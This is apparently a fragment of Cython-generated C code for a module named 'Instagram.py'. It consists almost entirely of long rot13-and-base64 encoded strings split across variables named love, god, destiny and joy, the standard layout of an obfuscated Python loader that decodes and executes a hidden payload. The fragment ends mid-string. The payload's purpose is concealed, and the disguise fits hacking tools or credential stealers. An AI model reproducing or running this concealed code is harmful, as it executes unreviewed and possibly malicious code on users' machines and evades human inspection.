 * love = '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'
 * god = 'RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMGkrWlFWYVlzUlp4cXR4WjJma2ZVdll2QW9Pb1BvNEt5RGZoQ2RRK2djZHZUTUl4aXpWOC9MWS9xUzNMQWlRK3FtUG96T0MrZ2NSV2VFVHdVNTZ6NDBVV1pHbkVVaFBZRlNFK2lzb0lPVFBVUm9hVzNaSEpEbksvbVNqUE5Za0oydTRUcFZGczVLSVVvcnNvOEw0TnlkdGxZeHRDZ3RucHI5VFZJZ2dTaXRjcHA5amZjdkswaEJvN1FLWlBZMjNxWGxyYWorSXQ1c2xhOVhnUG5MdExBcXAzMmc2dGJFRXhCOFRWdFJERXdJUkd2aWpJNUtMYzBZNmppMXJhUDJxL2VqZzN4SVI4dHdQVWtjbnRKTlM4bmo0TjNrM2hObXV6YzllV0V0MmhCeXZoVFZlMUgvajcrbWxpczVJTjRMYTlnZUY4MHVKNDYxb0hlV0tXWW42TFJ5dmFRYjgzd0pyNTJJNTB1N1JlU0MrajVlN0MvenNzNlkzVlQvSzBvSjJ0YWFFQndmTjVQZUR1UE9FOHJEdzdMM2pqdGJPVExTZExyUG1hSGpzM1pJUzNYa21EUkxwNTl3ZUR6eWNWb2NhMlQwdU54QUZKM1BDZEwwNFN1Q1BYMUkwM24zMFRubjBIK2MzYU4xUEpwYzFPZVEzcmRtTWlXN0cyWXllSm0zT3gxY3h1Z3VYZUowWVNhelFoMEtWL1F5R1ZvVDVjRjUxUUJWT1pQUk0xeDdVSXlWV2xDOXI1V05NdGNhUWk3NXR4V0NCYjdTWnEraUVjRzNPZnlDSzJndDBWa3FnN05xWjYyekpTMEZ3TllhTEwzQ1dkdmpZYlpvb3o2QVJmc2RwUEEzckRXNUdmR1lpRE9VdmFRYnZBUzZ3QkN0NzB5SnVQcXo3OGYrdHpwanB5RWtTU3MrY0NWTjBTcVY5RmxNK3VXdTVqVmZpYW83UXVHZjFoM2g4RS9jSS82VDRXaFUzTzBuaVg0OFBxczdKUCtuZFlmUC8zUDNpUDU4T0JDbDFUaFpjczloY1ZnSy9wL2dwOEVRSFA2WUQxUEdlZDNERXRYdFl6cFRqNjB6Q1JKZ1RzMFFESEZMd3JuY2JSajdtSzhQTlIrZjRXZCtheldGbXhRRmFBMk1Wci9JdkNpQ3ZONHliNDJ1QmZRWjFLYWM5Wm9XYTgwTS9USHZlTWhhTjBGM3FFTE1lZUdMS3MybnhrL2dHcFFuTnpSYzh1VFhadVdISE1KdjhKUWoxamdkVzIxbDdjaklXUWZvYzNHampYV3lMdEM5MmtHSDZ3WjlyZ2UwclE3dzkvWUxrTi9vWmdBaytxcW9aMGhzRDYxNEJWaC9QNjJEUVJwN3JhdDlkT1YvNUtkeHRXVjNtVWMrTE1YZGUzZFBHeTFRWDExT2ZlMG5QeS8vb0NjODZBay9RQ082VEtYcDVucXFSL0tnSy9rb1JIZDczUEVkTklQZWpjOUFWd21TQ2RodU5SK3BCaHQwbGVDWGc1WUpHUGpJQkd6b3hpZVgvcXBkK09RM2Z1OERZY2RQR093TzdwMzI0TDRUa1YrcDVIUEtpalhnZnRKamorQTdYZmFkNjhwYVdjc3JPVG1WSktzVW1oWTJ3L0tyRlZYZmtFK2FGNTg4TDhOWFVSSkdzV1Q1enREMDZYMWpiakduRnBqS2h1OWlRblBtQzhPNlVsakw4SW5NNVBqazdQVGs5R3hxY21JbWRTSTVNenM1bkMxV0NzYmNkSklUbCtVNjlvTDJLYXBlM2duZ0tKeW9pUXJSbVZvWVEzRTFhY2YzMHR4cFRsNlEyT3pFNUZ0cVRpMHJHaHIvN1BUS0YzRzdBWTNndDNGdlFyNmtGT1NUTzBHWkp4ZXlySUZHK3ZpWXNJRnBoM0NDQjgwNGZPQncwTTg0QThzSloraVlwZEtCN0xMS0J5aDNiTXJXRDFBME5sMXpCcG1YYkJDbFFZWkEzcDN2SWRqbFdKMjBaM2tvMkdOT2tiVG5nVG96OWwxblBjbkNiNjl4aGpzVzJGTlFTY3ZPdzdIUEFMY1I1YjhDem44aWxCZHcxcWRiSEVYY0V2MVNETTdIQWQxVGlPQ2YrbjFQUlVRNndwOGVrK0wybXY5WEdsRXU0RVc1YmtTNUgrQnFsWUdyNEpJaDBZb0wrdjNrRDVBTlFCRHhESkRQajJ2ckxMUW1nUjRSb1B1U2hYclNoN1pCZGFUT0lEcTBHbVpSZkl0WkMyQlF4SWl5R0dzRmJHa0IzSWtEQnJVQkJzWEEzdzZvMGRFdmJJcEc2eTRsNmVRbHdRMEQ3dm82djlxS3N5RHIzZ1pFNjBPMGJDWDVvSVdDV0lKZWtPc2poTnJ6eEZMMEV4SWUzdlNCeEFDWmlFcHNMOGkxVlgwVzd1MEhIK1hQUkFzQld4Ky9aeUhmYnhtdFVLL3R6dE1Na3A4L3pRRlB1TThUTGhzZGlHK1VOOGM5d1NNNTVFcGF1TmRaaDN0ZEQ4V05pRFZMMDc5ckN3V2J6ZEpZeUdmTjA2QkZRRE9rQzNGeWJxM0FpemJPNldnM3BOOGxpY1NaVEVhWm0yZ0tNQ0VBdGRMSzNSd0JDeVIyUTBHRmlDQ2xKbWIwcjJQb2kwOVpOZmRPVWRja2pabDdyT2xwcmJDTXNJajROa0V2by80dVp2d1FuZmZRK1YxMHZtbkRsLzQrNXRiTlVjc0ZySGtOQ3ZSN2VQLzNFVEc2bTRMUytUcGtlZ29hVFhPZ1UwczVKYXZ1amswQkczVnN6UEZhYk5rc2NzRUZIZXZhRFhKdHZ6eFNyckZYSStoOEZaeS9SQXk0U0tCemxKYTNVOUpOQUp4ajRyNW5vVjhPMkRnR1JsOXRCQnZzUG50c3NCbjIwVFQwMkM4QU40bi9YK0FtSXBqL2xFclJCN0o3Q0JiNm4xaVNBWUtjUllLY3ZSYms3TE1nWnovRkgyd0tPUTMzT09SWU9mdllnV2ZPK1REUXhzYWMvVTdxL3NkeWZ1eWVCWGIvNXU3WEcrQk85c0Rhd1YzZ2Jvamc3dEF1Y0hkNE43Z3JSQzJ3RzdNbmMrNlcxb1c3ZHlHMEcwTHoxcVR3MzFKNUhNT3JIc2o3ZHdGK0EwK0IzMEFEL0FhK0hMRGdGM3dFdjBlYXdxLytJVHE3UWEvK0VUcE5ZRmQvaEE1TlRmMERkSWpCL1NFNkNMaTM5UzMwYmdzNEFXTkJLZG9sbmJHcDRoT0FOQzJWMWx3dzFiK0Zqb3VkdmI4YzdOVC9TTmlGMHlGZHFuVmNWVGNXaTRyT3JnQWgxdlZLeWVCNEdyU0luZnRic0pjQmJWUjBsWEJYQzA5NlZIVlhXN2VsUExaRWpvN3ZJbkVqeEQ0QTUyZUlmTDhsb1BidVFxd0VQNFRaQVF0c240ZmJIUVZ1NThjMXdSL0hXMzhoa0g3UUNOSjFldTg0TXNJZi9UL1VlMy85ZWZYZXJSYld6anEyMGVvb1ZxZi90cTdHV1NmcHYxMEFoRzFHdTJYOVNUb3ZBR0VmQUdFbitBR21iUjJXdGNLeGwydXdVSllwMEluYmdkZHhuWGdRNG5hQmhndmd5bVE0RGhJUURubENEdFhweHJHbnkxcmcrVGJveURHbzIyNm5iZytUbnovckVVOTQwQk0rYlBTQSswS2RqdXhLSG5VbExiRHFyZU9LZlFCV3ZiOFVMWG5raHY3YjJOMS94NGFVcHRqMWR4M3Nlc2ZCcm04NFVFYnFjTVNhRGdZR1JnYW9xS3FZTCt5dUdhdjNTN21pcmlZZ3FKellIZjd1SVV6NFFIZE9oOHY4RXc3bGREeW5vTGxueHJKQ1NnZnpLdE9Vc2d0eTZRQ0ZjTmgwbWFPai9YTEUrM3YxaUxmSFZXMzFEOUQ1KytnOFVhM1YvOENCdUwrNVp1dGFSZG9rTU9td1IzdUhRZEpGTnI1UkFEUmJSNFcxR0tRSEp5MGJod1diaXRwcEpiMG1selliZlV5emZSc2M2R1ROTmR2VDRrWHhKSVE4bjJicjROamJqVGdXOU9MWVg2RWQ1dmVlbFdwV29iL2ZFL1IvaGJqWFZEcHNTU1BlK0lIK1JRQnZDT1dJQWdicU5NNGdJaGxyQWRwNjJ3aFpKQUJ0dzJNV0NVQi9heDF0amJBNFlWOEthYURSc2hWRDIwMUVYc0MwVnRaaGtiTk93Sjg0Mm1zaXBoSEo3U0xiZGRMbmdLS0ZDWFVDdTBsd0ZMajdlU01BZGRMbVBHVTMrZmxUOW5qQ2ZaN3dYaUkrZlhXMHlKWGM0MHBhU05QaHNYWGZyUWI2RzJ6ZE96ZCs2bENuM2VJOEMzVWFhRXFkQUZ2bWkzbEZLMWk2NjRqUGpMNjhqT3NEaUNUZzMxQldpa1h5eDE1ZUtSck9uWkMxNTRvdmszM2RBU3lIZTJuLzAyZmhsL1lYdmpxYVZLOXFObUNGT2U0VVNIWUxNaXE3QlFHL3B5QWpYVTF4eEFXT0JsNUZzTktBUnE3MWRUTUlDYm9RNHN4cjFaTWNCeHRjZXNTQkJpZkh2T3FtcTdvNk1KTjBaOXJjRFUrUDRjWFhzQ0NJRjY4SVhDa05pL1BFbW1JU3Jta01QWmRhT3V6T2duMnRFU3Z3RDQzanNjTEt1SzZtQ3ZodHB6UnhucmVGdEEvdG9lRHNaNEZiVURYNjM4RUVSRTlrWEREdHRNRm15Uy9BQzFnVk1zSXl2SFlaa1Z6SlBHNzR0dnpid3J0SEVTcTJBdmdKcWszSDFPcmRPQkFkMzFhb0txM1NpL3VZV2MreFJnUGx1cnV6RFVZL0tYaUZJaHQzcmNtZ'             # <<<<<<<<<<<<<<
 * destiny = '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'
 * joy = '\x72\x6f\x74\x31\x33'
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_god, __pyx_n_s_RkRjlmUnVkMWRGQTUxRCtIRHBJMUhlMG) < 0) __PYX_ERR(0, 5, __pyx_L1_error)

  /* "Instagram.py":6
 * love = 'CX21THHIcX3AzrQIeX2MaDzM4nRH0pSyRMauGHzMjnzy3o0yxn2Sxqat2HJAyHIS1oQO4X0kCM0jeEzqGImyvHTqgLl9uqIuzMmyzE0jmLHkAIxIGqmHiIxuJGQDjA3WREv81AGAyEINiZ1uxEISdY3cRZ2yDrUACHyILYmA6nzDeEwuDDwMDnIZ2FwqbGIqdIKMaoyyEoP83LwEjGJM5ImyToSIupRkDBPgnLzD4Hv9Vqx5VrSqSrREeL01IqGuSZmWTq2teDwEDFmyinl9GESEzF0yBpJ0mAxqBZKt0BTqho1ObozAMnxqWraMRFIMUFzIgqSy6X01xpwEAGyWWITt2ImEJMSblGIIIZIScZJABrT1RHTWVGT5irwHmBHEmAKN4Z1EmIKq5MxARAwuDpREQDyZ2DFgEHQWcExx2n0gKMHuiEUbipHcRo1cinKAyGQOXX0ucBKSbGHM0L1AMAHWPLwqgqSS2p05nA2q2ATkGY0ugp2IZnmH3FTSZFxyuZ1qjnR1MMJg0ox15A2EXHwSgEmOJn25nZTLeJxIxBKSOAxyhLxI0LwqurUWKBKqInyR3I3cLpHSbozEKX1WBZaWLLKbmpJ9WAzMwBGubnmyIFz85FQOgp255qUOvF0SzrHAREGWKqxMSLKuuL1b5pz4eMGH5qyOhpJgjp0ICov9irTShqxu4Az9ABHEgoH1IqmOzHRM5MP9aHUu5DGWhMIxiHKM